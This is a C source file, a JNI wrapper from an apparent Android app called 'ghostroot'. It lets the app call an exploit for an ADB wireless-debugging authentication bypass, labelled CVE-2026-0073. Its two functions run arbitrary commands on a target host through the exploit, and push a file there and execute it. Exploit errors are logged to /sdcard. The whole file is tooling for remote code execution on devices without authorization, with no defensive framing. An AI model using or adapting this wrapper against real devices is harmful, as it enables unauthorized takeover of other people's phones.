/* JNI wrapper around adb0073.c (CVE-2026-0073 wireless-debug auth bypass).
 * Loaded as a shared library so the app never has to exec() a binary
 * (untrusted_app cannot exec from lib/ -- child dies silently).
 */
#include <jni.h>
#include <stdlib.h>
#include <string.h>
#include <stdio.h>

extern int adb0073_run(const char *host, int port, const char *cmd,
                       char *out, size_t outsz);
extern int adb0073_push_and_run(const char *host, int port,
                                const char *local, const char *remote,
                                const char *cmd, char *out, size_t outsz);
extern int adb0073_verbose;

#define PNR_BUF (8u * 1024u * 1024u)

JNIEXPORT jstring JNICALL
Java_com_fuxi_ghostroot_Native_run(JNIEnv *env, jclass clazz,
                                   jstring jhost, jint jport, jstring jcmd,
                                   jboolean jverbose) {
    const char *host = (*env)->GetStringUTFChars(env, jhost, NULL);
    const char *cmd  = (*env)->GetStringUTFChars(env, jcmd, NULL);
    if (!host || !cmd) return (*env)->NewStringUTF(env, "[-] jni: bad args");
    /* stderr from adb0073.c goes to a file we can read from the app */
    freopen("/sdcard/gh_jni_err.txt", "a", stderr);
    adb0073_verbose = jverbose ? 1 : 0;
    char *buf = (char *)malloc(PNR_BUF);
    if (!buf) return (*env)->NewStringUTF(env, "[-] jni: oom");
    buf[0] = 0;
    int r = adb0073_run(host, (int)jport, cmd, buf, PNR_BUF);
    size_t len = strlen(buf);
    char *reply = (char *)malloc(len + 64);
    if (!reply) { jstring s = (*env)->NewStringUTF(env, buf); free(buf); return s; }
    if (r != 0) snprintf(reply, len + 64, "[-] exploit failed rc=%d\n%.*s", r, (int)len, buf);
    else snprintf(reply, len + 64, "%s", buf);
    jstring out = (*env)->NewStringUTF(env, reply);
    free(reply); free(buf);
    return out;
}

JNIEXPORT jstring JNICALL
Java_com_fuxi_ghostroot_Native_pushAndRun(JNIEnv *env, jclass clazz,
                                          jstring jhost, jint jport,
                                          jstring jlocal, jstring jremote,
                                          jstring jcmd, jboolean jverbose) {
    const char *host   = (*env)->GetStringUTFChars(env, jhost, NULL);
    const char *local  = (*env)->GetStringUTFChars(env, jlocal, NULL);
    const char *remote = (*env)->GetStringUTFChars(env, jremote, NULL);
    const char *cmd    = (*env)->GetStringUTFChars(env, jcmd, NULL);
    if (!host || !local || !remote || !cmd) return (*env)->NewStringUTF(env, "[-] jni: bad args");
    /* stderr from adb0073.c goes to a file we can read from the app */
    freopen("/sdcard/gh_jni_err.txt", "a", stderr);
    adb0073_verbose = jverbose ? 1 : 0;
    char *buf = (char *)malloc(PNR_BUF);
    if (!buf) return (*env)->NewStringUTF(env, "[-] jni: oom");
    buf[0] = 0;
    int r = adb0073_push_and_run(host, (int)jport, local, remote, cmd, buf, PNR_BUF);
    size_t len = strlen(buf);
    char *reply = (char *)malloc(len + 64);
    if (!reply) { jstring s = (*env)->NewStringUTF(env, buf); free(buf); return s; }
    if (r != 0) snprintf(reply, len + 64, "[-] push_and_run failed rc=%d\n%.*s", r, (int)len, buf);
    else snprintf(reply, len + 64, "%s", buf);
    jstring out = (*env)->NewStringUTF(env, reply);
    free(reply); free(buf);
    return out;
}
